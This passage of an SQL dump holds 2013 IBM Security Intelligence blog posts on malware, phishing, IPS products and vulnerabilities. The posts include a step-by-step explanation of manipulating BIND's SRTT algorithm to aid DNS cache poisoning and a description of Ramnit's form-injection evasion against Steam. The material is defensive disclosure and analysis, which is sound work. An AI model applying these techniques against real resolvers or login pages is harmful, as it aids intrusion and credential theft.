IBM, we’re working on expanding our interactions with EU companies to help them learn from our experience with application testing and  . In the coming months, the AppScan team has committed to being more active in the EU so we can help transform application security testing from “slow idea” to accepted standard operating procedure. Thanks to the great work being done and the conversations being had in the EU, application security is at an adoption tipping point in the region. Perhaps, someday there will be an IT equivalent of The Gross Clinic. We’ll look back at a time when we didn’t build security in and rigorously tested applications for vulnerabilities and infection points before deployment and wonder how we could ever have thought that made sense.', '\'Application Security Testing\'', 'https://securityintelligence.com/the-key-to-moving-application-security-forward/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (593, 'This Is No BlackOps Game: MitB Malware Targets Steam', 'Etay Maor', '2013-8-19', 'When cyber criminals use   to commit online fraud, financial institutions are not their only targets. Dating, e-commerce, hospitality and travel sites are also being attacked, as is the gaming industry. While some cyber criminals focus on hacking into gaming company networks — for example, the PlayStation Network, Club Nintendo, Ubisoft and Konami — others use sophisticated malware to steal client credentials. The IBM Trusteer security team recently identified a new configuration of the Ramnit malware, which uses HTML injection to target Steam, the largest digital distribution platform for online gaming. In this attack, Ramnit successfully circumvents the site’s password encryption while defeating server-side detection of the attack. With an estimated 50-70 percent market share, more than 2,000 titles and over 54 million active users, Steam is the perfect target for malware attacks. This is not the first time the platform has been targeted by cyber criminals, either; phishing attacks and credential-stealing malware have been targeting Steam users for several years now. Ramnit, however, uses much more   to collect data and evade detection. The IBM Trusteer security team identified the following code in Ramnit’s configuration file: When a user accesses the Steam community log-in page and enters his or her username and password, the form is encrypted using the site’s public key. To overcome this client-side encryption, Ramnit injects a request for the password, which allows it to capture the data in plain text. The injection of this element, denoted as “pwd2,” can be seen in the second part of the code shown above: While this simple technique is good for overcoming the client-side encryption, it also raises an issue: Steam’s server is not expecting to receive this new element (“pwd2”) when the form is submitted, so it doesn’t know what to prevent. In fact,   MitB malware by looking for forms with injected elements. For example, if a form with a username and password is filled out by the user and sent to the website, the security product will scan to look for unknown elements that may indicate HTML injection malware. If the form arrives at the website with a username, password and credit card number, this will trigger an alarm indicating the user was a victim of a MitB attack. To avoid detection, Ramnit simply makes sure the server never sees the injection by removing the injected element prior to the form being sent to the website. This can be observed in the first part of the code: Why do cyber criminals go through all the trouble of injecting an element and then removing it when they can simply collect the data using Ramnit’s key-logging capability? The answer is simple: By using form grabbing, the cyber criminal can easily index the collected data. When a key-logger is used, there is no indication of which characters denote the username, which belong to the password and which ones are just irrelevant keystrokes. In such a case, someone needs to manually separate the wheat from the chaff. While Ramnit uses MitB malware and evasion techniques to steal   from Steam and other organizations, Trusteer Rapport and Trusteer Pinpoint Malware Detection can detect, mitigate and remediate Ramnit infections. The IBM Tusteer security team continues to investigate new malware variants, understand their techniques and capabilities, and update its solutions in order to provide effective protection against the latest threats.', '\'Cybercriminals\', \'Data Breach\', \'Data Protection\', \'Financial Industry\', \'HTML Injection\', \'Malware\', \'Man-in-the-Browser (MitB) Malware\', \'Security Breach\'', 'https://securityintelligence.com/mitb-malware-targets-steam-blackops-game/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (594, 'IBM Announces Intention to Acquire Trusteer', 'Brendan Hannigan', '2013-8-15', 'Today we are pleased to announce that   has entered into a definitive agreement to acquire  , a leader in advanced fraud and malware defense.  Upon close, Trusteer will join the growing   and will significantly enhance IBM’s capabilities around web fraud prevention, endpoint security and advanced malware defense.  will additionally play a key role in strengthening IBM’s broader endpoint and mobile device management capabilities as well as our Smarter Commerce portfolio. IBM is committed to delivering security both for and from the cloud, and Trusteer’s SaaS architecture delivers real-time threat intelligence to the over 30 million endpoints around the world that are currently leveraging their capabilities. As many of you might already know, Trusteer has been developing a significant footprint in the financial services sector over the course of the last several years with a focus on fighting fraud resulting from malware on consumer endpoints. Trusteer developed a set of endpoint defense capabilities that banks purchase and then make available to their own customers to help address this challenge. IBM has extensive experience working with the financial services sector community, including tackling challenges associated with security, risk management and fraud and Trusteer’s capabilities will help us to deliver a more complete and specific set of fraud prevention capabilities.  Additionally, clients will get substantial benefit as Trusteer’s capabilities are more directly integrated into IBM’s respective security, mobile and commerce capabilities. Through extensive research on the installation and behavior of malware used in fraud and organized crime, Trusteer has developed an approach to application control that profiles the behavior of common endpoint applications and web browsers and then blocks the application from performing actions that are out of the ordinary.   Trusteer has achieved   in this space, saving banks a lot money and consumers all of the pains and headaches associated with being a victim of fraud.  Trusteer now boasts as its customers seven of the top ten U.S. banks, nine of the top ten U.K. banks and is successfully expanding globally. This success and expertise has positioned Trusteer strongly to apply its technologies to the enterprise endpoint defense and advanced malware prevention space.  This is a logical extension for a company with such an extensive, existing understanding of malware and how to combat it.  Taken in combination with IBM’s other capabilities in the advanced threat detection, analysis and remediation space, IBM will now be able to offer our clients several layers of defense against sophisticated attackers. As mentioned previously, one of the driving factors of Trusteer’s success was found in their commitment to, and excellence in, malware research and threat intelligence, and one of the things we are most looking forward to is the Trusteer research team expanding IBM’s existing security research capabilities, most notably IBM X-Force.  When combined with the teams we also have in IBM Research, IBM now has an extensive research footprint in vulnerability research, IP reputation and malware installation and behavior. We look forward to working with the Trusteer team and their customers over the months and years ahead.', '\'Acquisition\', \'Fraud\', \'Fraud Prevention\', \'IBM\', \'IBM Security\', \'Malware\', \'Technical & Product\', \'Trusteer\'', 'https://securityintelligence.com/ibm-announces-intention-to-acquire-trusteer/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (595, 'Subverting BIND\'s SRTT Algorithm: Derandomizing NS Selection', 'Roee Hay', '2013-8-13', 'Today I presented at   a new vulnerability that we had found in BIND, the most popular DNS server. Exploiting this vulnerability allows to reduce the amount of effort required for an off-path (blind) DNS cache poisoning attack. The whitepaper is now publicly  , together with the   and ISC’s (the organization behind BIND)  . In this blog post I will describe the vulnerability in a less formal fashion. An off-path DNS cache poisoning is an attack at which we assert that the adversary does not see the traffic between the DNS resolver and some name server (NS), but manages to poison the cache of the DNS resolver nevertheless. In order to do so, the attacker usually induces a request between the DNS resolver and the NS, and then races against the genuine DNS answer. DNS protects against this type of attack by having some random data inside each DNS query. The random data consists of 3 elements: The destination IP address can be random if the target zone has multiple authoritative name servers. We will see next that it indeed has some random properties.  The resolver accepts the answer if and only if the DNS answer contains matching data, otherwise the DNS answer is simply dropped. This means that the attacker must first win the race against the genuine answer and then guess the random data correctly. Since the TXID and UDP Source port randomness are well-studied, we decided to focus on the randomness of the name server (NS) selection. We wanted to see how much entropy can be added if a resolver simply chooses the target NS randomly out of the authoritative name servers. In order to do so we gathered some statistics. We downloaded the    and created the following CDF graph: From the graph we can see that almost half of the TLDs have more than 8 NSs. This means a truly random NS selector can bring some entropy but obviously not as much as by randomizing the DNS TXID and UDP source port. However, derandomizing such algorithm can make existing attacks run faster or be more efficient. In addition it can make an off-path attack become on-path (Man-in-the-Middle), if the attacker is on a path between the resolver and some authoritative NS, but not on a path between the resolver and other authoritative NSs. The goal of the resolver when facing multiple authoritative NSs is to choose the fastest one, by Round-Trip Time (RTT). Since the RTT changes frequently, BIND maintains a moving average for each NS IP. This value is first   with a very low value between 1 and 32 microseconds. Each time there is a valid DNS response available, the SRTT is   with a weighted sum which takes into account the old SRTT value and the newly available RTT. The weights are 0.7 for the old SRTT and 0.3 for the RTT. In order to avoid starvation, any non-queried NS out of authoritative NSs thatt can be queried, is multiplied with a  factory of 0.98. In   situations, such as a network timeout, the SRTT is punished with 200ms with an upper bound of 1s. The authoritative name servers are simply queried in the order of their SRTT values (NS with lowest SRTT is queried first). All of the SRTT values are stored inside a cache which is accessed by the NS IP. Now that we understand the SRTT algorithm, we can safely claim that If the attacker can somehow influence the SRTT algorithm, he can derandomize the NS selection. He can achieve this in two different approaches. The first one is to increase the SRTT of all name servers but one. The other strategy would be to lower the SRTT of the target NS. There are two previous works which try to tackle the NS selection. The first one which adheres to the first approach is [Herzberg & Shulman, 2012]. It abuses IP fragmentation in order to cause the   operation of the SRTT algorithm.  The second, [Petr, 2009], adheres to the second strategy. It uses fast spoofed responses in order to exploit the   operation of the SRTT algorithm. Both attacks are probabilistic (i.e. there is some guess work behind them so they don’t always work). Our attack is deterministic  (i.e. it always succeeds), and in addition the NS which we lower its SRTT does not even see it. In this post I will describe a simple variant of the attack, the more sophisticated ones (but not more effective) can be found on the  . Our attack abuses non-open resolvers, i.e. NSs that do not answer on queries that they are not authoritative of. Most of the resolvers around the Internet are non-open. The attacker does not need to control them, but simply needs to know their IP address. We will see how the attacker can take leverage of them in order lower the SRTT value of an arbitrary NS to an arbitrary value on some target resolver. The attacker also hosts a malicious NS. We assume that this malicious NS is the authority of some domain, i.e.  . Let’s also assume that we want to lower the SRTT value of one of the authoritative NSs of  . It’s important to mention that our attack does not depend on the amount of authoritative NSs the target zone has, but for the sake of simplicity, in this example, the zone has two nameservers: NS1 and NS2. We will lower the SRTT of NS2 on the target resolver, so it will be queried before NS1. The attack begins by first querying the resolver for some domain the malicious NS is authoritative of, e.g.  . The resolver will eventually approach the malicious NS, which replies with a DNS delegation that contains: We assume that NS2 was already on the SRTT cache of the resolver and was contacted prior to the attack, so its SRTT is based on some real RTT value. Since the non-open resolvers were not on the cache, they will be added with very low values between 1 and 32 microseconds according to the SRTT algorithm. This means that they will be queried before NS2 by the NS selection. The resolver will query each of them and they will refuse since they are non-open resolvers. After each query the SRTT value of NS2 will be decayed, i.e. multiplied by 0.98. The resolver will time out after 30 seconds and we can force this timeout if the amount of non-open resolvers is sufficiently large. This means that the resolver will not even get to querying NS2 and at the end of the attack the SRTT of NS2 will be 0.98^n of its original value, where n is the amount of non-open resolvers which were queried before the timeout. The root cause of this vulnerability is that the resolver maintains a shared cache of SRTT values. The cache is shared in the sense that a malicious NS can affect SRTT values of NSs which are not related to it. We suggest to split the cache. For example, it can be split according to the currently queried zone.', '\'Application Security\', \'BIND\', \'IBM X-Force Research\', \'Network Security\', \'Technical & Product\', \'USENIX\', \'Vulnerabilities\'', 'https://securityintelligence.com/subverting-binds-srtt-algorithm-derandomizing-ns-selection/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (596, '19 Amazing Hacks: Security Vulnerabilities That Cross the Physical Divide', 'Chris Poulin', '2013-8-5', 'With Blackhat USA behind us and Defcon in its full throes, there seems to be a trend away from purely digital hacks and toward physical devices. These include cars and implantable medical devices. To be fair, physical world security has been trending for a few years, including demonstrations of how to hack an ATM and smart meters. I’ve been interested in the intersection of digital and physical security for over a decade and   in 2008, partly to troubleshoot a problem with my navigation system, but also just to scope out the landscape. I had to build a serial (RS 232) adapter with a breadboard and solid state components to jack my laptop into the wiring harness, and my soldering iron skills leave one with the impression of kindergarten artwork, but it worked. And yet my project was completely occluded by much of the research you can find with a simple Google search. In that spirit, I’ve assembled nineteen links to research that cross the divide from some guy at the keyboard of his Linux PC in his parent’s basement, dressed in only flip-flops and pajama bottoms, and rebuilding his Linux pentesting platform for the hundredth time this month, to those pioneers with the  smarts to break out oscilloscopes and the dexterity to disassemble the dashboard of a Prius. Please to enjoy this smorgasbord of articles, research papers, and videos: 1.  \n 2.  \n 3.  \n 4.  \n The following is not technically automobile hacking—nor marine craft hacking—but it vaguely fits into the category of how to compromise a technology, navigation, that transportation systems of all types have come to rely on. 5.  \n 6.  \n 7.  \n 8.  \n 9.  \n As a side note, Barnaby Jack, security researcher for IOActive, was a star in hacking physical devices, including medical implants and ATMs. His recent death at the age of 35 is sad and a great loss for the security community. 10.  \n 11.  \n 12.  \n 13.  \n 14.  \n 15.  \n 16.  \n 17.  \n 18.  \n 19.  \n This is just a sampler buffet of physical security goodness.   and I’ll assemble a web page with as complete a set of listings as I can.', '\'Black Hat\', \'Hacking\', \'Healthcare\', \'Physical Security\', \'Transportation Industry\', \'Vulnerabilities\', \'Vulnerability Management\'', 'https://securityintelligence.com/19-amazing-hacks-security-vulnerabilities-that-cross-the-physical-divide/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (597, 'Mobile and Embedded Applications: Raising the Bar on Software Security', 'Diana Kelley', '2013-7-30', 'Not necessarily. From a pure business risk perspective, picking time to market over more security might sometimes be the right choice (much though security pros might be loath to admit it). Remember – the point of an application security program isn’t to win the title of “most secure.” The point is to give the stakeholders and decision makers targeted, accurate intelligence so they can make business focused risk decisions that meet the company’s needs. If the risk of preventing a key application from deploying is greater than the data loss or downtime that could result from an exploitable vulnerability in the app, then deploying (even with that vulnerability) may make the best business sense. Even more sense? Using tools and tests to determine that the vulnerability is there, putting a compensating control like an IPS (intrusion prevention) rule in place to prevent an attacker from exploiting that vulnerability and creating a response plan for fixing the source of the vulnerability in the application code as soon as possible. In a perfect world, the company has a robust security methodology in place and applications never make it to final user acceptance testing with the vulnerability in the first place. But we know the world isn’t perfect — and that many companies are far from being at a point where all applications reach UAT completely free of defects and exploit exposures. And the problem is growing because the number of applications is growing. In 2013, car manufacturers have more than crash impact tests to worry about. Now they have to evaluate if their   and their   is PCI compliant. We’re still building complex applications to power back-end business processes, we’re still building web and cloud-based solutions to embrace features those platforms provide, and now we’re also writing apps to feed the hungry App stores of Apple, Google and Microsoft… all to power increasingly “smart” and connected devices from TVs to cars. With all those apps to build, test and secure, companies need a better way to make application security and risk decisions. That’s why I believe we’re seeing these programs transform. We’ve already seen a move from manual code reviews for a small part of the portfolio to use of automated, and manually assisted, testing tools on a much larger part of the portfolio. In 2014 and beyond we’ll see companies move towards using targeted intelligence from their testing programs to enable them to, not only make better risk decisions, but also to lay the groundwork for continuous improvement of the program as a whole. Watch this space for ways to use intelligence to improve security throughout the SDLC, but for now, let’s take a look at one aspect of the class risk equation, “consequences”, as it pertains to mobile and embedded application security. To determine the consequences of exploits in a mobile or embedded app, consider the user base and what can go wrong if the vulnerability is exploited. Consider companies that produce mobile apps aimed at children and who, for the second time this year, have been called out by the FTC: most recently in the report “ .” If the application is made by a company that is more interested in short term gain than long term reputation, failure to make proper disclosures may not be a concern. But if a brand builds value by having parents’ trust, then failure to violate disclosure policy could negatively impact long-term financials. Another consideration is compliance, the   was passed in 1998 and failure to disclose how data is used in a mobile app aimed at children could be in violation of the Act. There are consequences to exploiting vulnerable applications on devices like cars and TVs too. Researchers recently published an exploit for a popular   that allows remote root access to the television and access to files on a USB plugged into the TV. One of the consequences of this kind of vulnerability is brand reputation damage for the manufacturer. If a customer has sensitive data on the USB and it’s accessed by an attacker, the customer could get their loss covered in the media. Is that a major consequence for the brand? Only the brand can make that decision, but the application security team can help the decision makers be smarter about their decision by providing data on ease of exploiting this kind of vulnerability — and draw clear damage and consequence scenarios. What are the consequences of an attacker retrieving music and movies off of a USB? What about sensitive data about that owner of the USB? Very often consequence discussions include scope considerations. Will an exploit expose data for many users or only a few? Contrast a vulnerability in a database that stores millions of health records with a Trojaned mobile app that can only gather health data about the owner of the phone. There’s no doubt we are doing more with software and deploying more apps both mobile and embedded than we ever have before and that makes the security of those apps a major concern going forward. As application security programs evolve to include security throughout the lifecycle, we will get smarter about the risks associated with those applications. And we must know what, if any, vulnerabilities exist and make smart risk decisions to determine if the consequences of exploiting those vulnerabilities are critical enough to justify blocking deployment. Block too many apps and you impede business progress — but let a critical app into the Play or AppStore that results in loss of data, and you could bring about significant brand damage as a consequence. To make smarter risk decisions we need to improve our application security programs. Organizations can’t afford the impact of bad mobile and embedded application risk decisions and that’s why I believe we’ll see a transformation in application security programs that puts the emphasis on understanding the consequences of the exploit and the total business risk picture.', '\'Application Security\', \'Applications\', \'Mobile Security\', \'Risk\', \'viewpoints\'', 'https://securityintelligence.com/mobile-and-embedded-applications-raising-the-bar-on-software-security/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (598, 'Network Security: Is Your Intrusion Prevention System Ready?', 'Paul Kaspian', '2013-7-26', 'Intrusion prevention systems have become one of the most critical layers in today’s network security infrastructure. Although a mature technology, intrusion prevention technologies employ some of the most sophisticated analysis capabilities available and are tasked with identifying and blocking an incredibly  , while doing so at lightning fast speeds required in today’s enterprises. It is clear that today’s intrusion prevention system must deal with an even broader and more sophisticated attack spectrum. Looking back at the key trends of 2012, and the developments throughout the first half of 2013, today’s   needs to address several key areas. Let’s take a look at the four most critical: As Phishing attacks become more prevalent, targeted and sophisticated, it is critical that an IPS is able to help protect both targeted users and the greater organization as a whole. Years ago, email security and anti-spam were the main solutions deployed for keeping phishing email from reaching users.  Today, with the increasing adoption of social media, inspecting email isn’t enough. Organizations need to have a way of securing the newest delivery mechanism for these attacks, such as social media. In addition to educating users on best practices, an IPS can be instrumental by granularly controlling access to social media sites that may be used as a delivery mechanism for phishing messages, as well as blocking access to known malware sites if a user inadvertently clicks a malicious link in an email that was not flagged as spam. In modern Spear Phishing attacks, social media sites catering to professionals are a preferred choice for attackers, making securing access to these sites a key priority for network security professionals. For the last several years, attacks targeting vulnerabilities in web applications have reined supreme. In fact,   – a staggering number considering the thousands of  . Modern day intrusion prevention systems must now deal with application-layer attacks,including providing monitoring and blocking of high severity web application attacks such as SQL injection and Cross-site Scripting. In many cases, IPSes can be used in conjunction with a Web Application Vulnerability Scanning tool to provide near-term protection as vulnerabilities are found and subsequently fixed. This one is pretty straight forward – if you can’t inspect it, you can’t secure it. With the extensive use of SSL encryption in a variety of applications – including popular spear phishing vehicles like Facebook and Twitter – intrusion prevention systems must have the ability to look into encrypted sessions to identify potential security risks or attacks. This could be a user accessing a a malware-infected site over SSL (possibly through a shortened link)or an external attacker using SSL to mask communication with a botnet command-and-control server. Since this type of inspection can often be very performance intensive, it is critical that today’s IPS solutions are able to perform this type of  inspection extremely quickly and with minimal disruption. With attackers now executing targeted, multi-faceted attacks, an IPS can no longer function in a silo. Modern intrusion prevention systems need to be able to integrate with other security technologies to help security administrators understand what other events are occurring outside their immediate view of the network. They also need to be able to provide security events and data flows to other analysis tools to perform critical correlation and anomaly detectionfunctions. This enables network security professionals to detect security threats that may have already penetrated perimeter defenses and are now hiding within the internal network. Intrusion prevention systems continue to be the cornerstone of any organization’s main line of defense and will need to constantly evolve to meet the changing demands of securing today’s complex network environments. This includes adapting to new types of attacks, as well as attacks that are constantly mutating, while keeping pace with the speed and connectivity requirements within the Enterprise.', '\'Advanced Persistent Threat (APT)\', \'Advanced Threats\', \'Intrusion Prevention System (IPS)\', \'Malware\', \'Network IPS\', \'Network Protection\', \'Network Security\'', 'https://securityintelligence.com/network-security-in-2013-is-your-intrusion-prevention-system-ready/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (599, 'Casting a New Type of Net to Catch Phishing Experts', 'Tim Appleby', '2013-7-16', 'Fraudulent email messages, also known as phishing attacks, are seeing an upward trend in activity. These emails appear to originate from legitimate senders or organizations, to persuade, convince and entice the recipients to click on embedded link, baiting them into unwittingly divulging sensitive personal or enterprise information based on the urgency of the email. Depending on who the unsuspecting target is, the resulting attack can lead to identity theft for individuals or brand damage to the organization. As attackers hone their phishing skills,  and more realistic to the  , both at a personal and professional level, making it more difficult to identify malicious links.  URL shorteners can be used to disguise malicious websites and even legitimate-looking URLs need to be scanned with tools that will tell you if you are being directed to a malicious website. Attackers are also carefully selecting their targets like ISPs who provide a hosted email environment allowing a one-stop-shop for mass phishing attacks. As phishing attacks become more sophisticated, new methods and approaches are needed to prevent cybercriminal attacks.  Perhaps a big data strategy can level the playing field,  allowing enterprises to leverage security intelligence that combines known phishing threat data and other data sources to flag malicious emails. This approach would help automate the detection of malicious messages and take the burden off the email recipients, who blindly click away at links and contribute to the surge in email phishing statistics.', '\'Big Data\', \'Email\'', 'https://securityintelligence.com/casting-a-new-type-of-net-to-catch-phishing-experts/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (600, 'Understanding the Android \"master key\" vulnerability', 'Zubair Ashraf', '2013-7-10', 'Bluebox Labs last week   in Android’s code for cryptographic signature verification and app installation. They are planning to publicly disclose the details in their upcoming BlackHat US talk. Google has patched this vulnerability and some of the vendors have already started picking it up. Each app on Android is required to be cryptographically signed by the author. A very common threat vector on Android is trojanizing trusted applications, whereby a malicious party modifies the trusted app and adds malicious functionality to it. Consider for example, that a known trustworthy company GoodGuys publishes a game AwesomeGame and sells it a price. A malicious group BadBoys can then take that app and add malicious functionality to it, such as stealing user data, calling / sending SMS to toll numbers etc, retain the original game functionality and  publish it  on third party app store enticing the users to download it as a free pirated copy of AwesomeGame. To publish it on Google Play BadBoys would have to bypass Google play security checks and even then publish it under a similar sounding / looking name but something other than GoodGuys  or would have to have obtained login credentials GoodGuys to log in to their Google play account. On top of it he would need access to GoodGuys private key to sign the trojanized app. With the vulnerability that BlueBox Labs responsibly disclosed to Google BadGuys can release a trojanized version of AwesomeGame installation file which contains some code that is not signed by GoodGuys, but when Android attempts to install it,  it is tricked into thinking that all parts of the  app are signed by GoodGuys. Depending on where you take your apps from you may not have to worry too much, if you follow the best practises and you only install apps from Google play and you pay attention to the author details then you are very very unlikely to be affected by this, as the attacker would have to bypass several security measures to deliver an app from a trusted channel while pretending that it is coming from GoodGuys. The vulnerability details are expected to be publicly disclosed by BlueBox Labs at the upcoming BlackHat USA conference. But the details and POC have now appeared on the world wide web. It can be easily found online and I would rather not mention the details here. But as I mostly do, I would like to give an analogy to explain the vulnerability. Recall your drive through experience during your morning commute. in many setups you may have to pass through two windows, the first one is where you pay and the second one is where you pick up your order. The attendant at the second window is pretty sure that you are the one who just paid at the previous window. Now imagine (although it is hard to happen in the decimal world with humans but quite easy in the binary world) if the car behind you were to hit and throw you out of the lane and present itself to the attendant at second window… this is essentially what this vulnerability is about.', '\'Android\', \'Mobile Security\', \'Technical & Product\'', 'https://securityintelligence.com/understanding-the-android-master-key-vulnerability/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (601, 'Top 3 Security Enhancement Approaches to Protect Against New Threats', 'Vikash Abraham', '2013-7-9', 'An interesting aspect of being in a world-wide marketing role is getting exposure to a variety of real customer scenarios from across the globe, be it from sellers or customers. Stories about new threat challenges, changing priorities, failed implementations, business needs, cost pressures or administrative nightmares. Many of these stories have common patterns to them; this blog post aims at capturing the top 3 common security enhancement approaches taken by customers. With the  ; be it APTs, spear phishing, DDoS, cross-site scripting, etc, customers continue to use the well proven approach of increasing security layers within their IT environment to capture elusive threats. However, the variation in approach is mainly around where and how these layers are created. Some of the common multi-layer security approaches can be listed as below, in no particular order. This is a simple, yet effective approach, where customers add security to each physical (and now also virtual) infrastructure. Separate agents manage network, endpoint and hypervisor security. A recent example would be a leading telecom company based out of the Middle East, which faced state sponsored threats, and decided to take this defense in-depth approach. They implemented   across their 1000 plus servers and utilized   to secure their virtual environment hypervisors. They already had   implemented and successfully running, however with the increase in attacks, they decided to secure each layer to catch any of the slipped attacks. The challenge that this approach could bring is management of these multiple agents, hence products that can support heterogeneous environments and be managed by a centralized console is critical to make this approach effective. This approach is taken to get the best of both ‘worlds’ or in this case ‘vendors’, by combining the protection capabilities of different vendors to protect the IT environment. If a threat eludes one vendor agent, the second agent might identify it. An example of this would be a customer based out of North America, who had implemented the   product on all their network gateways exposed  to internet/ external traffic and used a competitor NIPS to handle aspects of their intranet traffic. This approach does give the customer flexibility to choose agents based on the need of each network and these optimization could help with reducing overall licensing costs as well. The main challenge to this approach is the need to utilize different consoles to manage separate vendor agents, hence requiring more administrative effort. This is about having an integrated view of the entire landscape, knitting separate incidents together to secure against advanced threats. Customers are realizing the importance of utilizing big data to capture potential threats that work in tandem with each other.   products that integrate with different point security products as well as review network and virtual network’s flow data have seen strong acceptance among customers. This also works well as it is a layer that integrates with the existing security landscape to provide additional value. However, currently security intelligence platforms mainly detect and alert on possible threats. They don’t act on it or stop the threat as such. It is only one-way communication from the agent without talking back to the agent. This will probably be the next level of integration that future solutions will evolve to.', '\'Big Data\', \'Critical Infrastructure\', \'Network Security\'', 'https://securityintelligence.com/top-3-security-enhancement-approaches-to-protect-against-new-threats/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (602, 'FBI Warns of Increase in Spear-Phishing Attacks', 'Dana Tamir', '2013-7-3', 'Last week, the FBI issued a   about an increase in spear-phishing attacks targeting multiple industry sectors. Spear-phishing is one of the main tools used by attackers to compromise endpoints and gain a foothold in the enterprise network. The attacker utilizes a specially crafted email message that lures users to perform an action that will result in malware infection,   or both. This is often the first step that enables   and targeted attacks. As the FBI warning explains, “Often, the emails contain accurate information about victims obtained via a previous intrusion or from data posted on social networking sites, blogs or other websites. This information adds a veneer of legitimacy to the message, increasing the chances the victims will open the email and respond as directed.” Spear-phishing emails often result in drive-by downloads, a silent malware download that takes place in the background without the user’s knowledge. Drive-by downloads are enabled by vulnerabilities in user applications like browsers or browser plug-ins, Java applications, Adobe Acrobat and others. Exploiting unpatched or unknown  , attackers can download malware to the user’s machine while the user remains unaware of the download. The attacker can then use a compromised device to gain access to the corporate network, steal intellectual property and compromise operational systems and/or financial assets. The FBI explains, “In spear-phishing attacks, cyber criminals target victims because of their involvement in an industry or organization they wish to compromise.” Employee endpoints have become the path of least resistance into an enterprise network. In the past, it was believed that proper user education would prevent phishing attacks. Despite the significant time and resources invested in education programs, however, these attacks continue to be successful. This is mainly because attackers use information gained through social engineering to personalize the spear-phishing messages and convince targeted users that the message is legitimate. It is impossible to prevent enterprise users from opening email attachments or links, since it is a routine part of their everyday activity. As long as we depend on online information, spear-phishing will remain a threat. In order to stop spear-phishing attacks effectively, organizations must prevent drive-by downloads and protect enterprise credentials.   offers exploit prevention technology that successfully stops drive-by downloads and exploitation of   that result in malware infections. Exfiltration prevention technology blocks information theft and prevents the attacker from gaining remote control over employee endpoints. Finally, credential protection ensures that enterprise users do not submit and expose their credentials on phishing sites.', '\'Advanced Persistent Threat (APT)\', \'Advanced Threat Protection\', \'Advanced Threats\', \'Corporate Network\', \'Credentials\', \'Cybercrime\', \'Cybercriminals\', \'Federal Bureau of Investigation (FBI)\', \'Phishing\', \'Phishing Attack\', \'Spear Phishing\', \'Vulnerabilities\', \'Zero-Day Exploit\', \'Zero-Day Vulnerability\'', 'https://securityintelligence.com/fbi-warns-increase-spear-phishing-attacks/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (603, 'Why Enterprises Should Fear Their Mobile Application Users', 'Tom Mulvehill', '2013-6-28', 'According to an InformationWeek 2012 report on the State of Mobile Security, the    In a mobile computing world dominated by Bring Your Own Device (BYOD), does this make sense?  Why should my employer care if my smart phone is lost or stolen?  My employer doesn’t have to pay me to replace my phone.  However, my employer does have to worry about the company, customer, and partner data I may have stored on my mobile device.  This is the real concern. Increasingly, users are under attack from mobile malware.  The malware is typically spyware or trojans.  It makes its way onto the user’s phone through phishing or spear phishing attacks, often directing users to bogus app stores.  This is especially true for Android applications which are available from different app stores and are not centrally managed and controlled like the Apple App Store. Once the malware makes its way onto the user’s mobile device many “bad” things can happen.  The malicious software will begin to mine for information on the mobile device.  It may try to access your contact database and forward along all your personal and business contact information.  There are many examples of mobile malware making expensive calls or sending expensive text messages without the user’s permission or knowledge.  It could communicate with mobile GPS services to disclosure your location. The attacks are increasing in sophistication and putting all unprotected data at risk.  This is the real risk to an enterprise.  Because an enterprise cannot control the applications its users install on their mobile devices, their applications and the data their applications use are at risk.  Even in a BYOD scenario where the mobile devices are managed, there is still little control on what applications users can install. If a managed mobile device is lost or stolen an enterprise can wipe corporate data and applications which will clearly mitigate the data leakage risk.  However, what happens if malware is installed on user’s mobile device.  The user isn’t aware of any risk.  Even if the device is managed the malware can mine for sensitive enterprise information.  Hackers are looking for all types of information.  They will gather what they can, forward it along, then figure out how to capitalize on the stolen information. What can an enterprise do to protect itself from the malware risk introduced by its users? The number one recommendation is to protect all data written to the mobile device.  Sensitive data needs to be encrypted. This is not limited to information stored on a mobile device in a file – it is all sensitive information stored anywhere on the device.  Sometimes mobile developers forget where they store data.  For example, a mobile application may cache sensitive information or post it to a pasteboard. This risk highlights the need for mobile development teams to quickly and efficiently identify all the areas in an application where data leaves the application.  Using a Static Application Security Testing (SAST) solution such and   helps to mitigate the risk to enterprise data by automatically identifying data leakage vulnerabilities.  Given the fast pace of mobile development automating mobile application security analysis is the only solution that will scale.', '\'Application Security\', \'Bring-Your-Own-Device (BYOD)\', \'IBM Security\', \'IBM Security AppScan\', \'Malware\', \'Mobile\', \'Mobile Security\', \'SAST\'', 'https://securityintelligence.com/why-enterprises-should-fear-their-mobile-application-users/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (604, 'IBM Security Trusteer Rapport Effectively Resists Carberp Bypass Attempts', 'Etay Maor', '2013-6-26', 'Earlier this week, IBM   that the Carberp malware source code was on sale in Russian forums. Since then, the source code was leaked and is now available to criminals and researchers alike for free. The leaked Carberp source code includes an “anti-Rapport” function as well as an old copy of IBM Security Trusteer Rapport’s installer for testing purposes. Over the years, we’ve seen many anti-Rapport modules incorporated into different malware strains. It started back in 2009 with a series of anti-Rapport modules incorporated into  , then a couple of anti-Rapport modules incorporated into SpyEye. It has now been incorporated into different malware strains, including Carberp. In terms of functionality, these modules try to achieve one of three main goals: Over the years, we’ve learned how to effectively fight these attempts with a combination of strong intelligence capabilities, multiple layers of protection and rapid response capabilities. Just as with previous attempts, Trusteer Rapport protects users from Carberp and is not affected by the anti-Rapport function. This was true before the Carberp source code leak and is still true now. IBM intelligence operations collect current threat data from tens of millions of protected endpoints and other sources around the world. Our special response teams track every piece of financial malware 24/7 and can swiftly analyze it and develop countermeasures. By designing an infrastructure that allows for 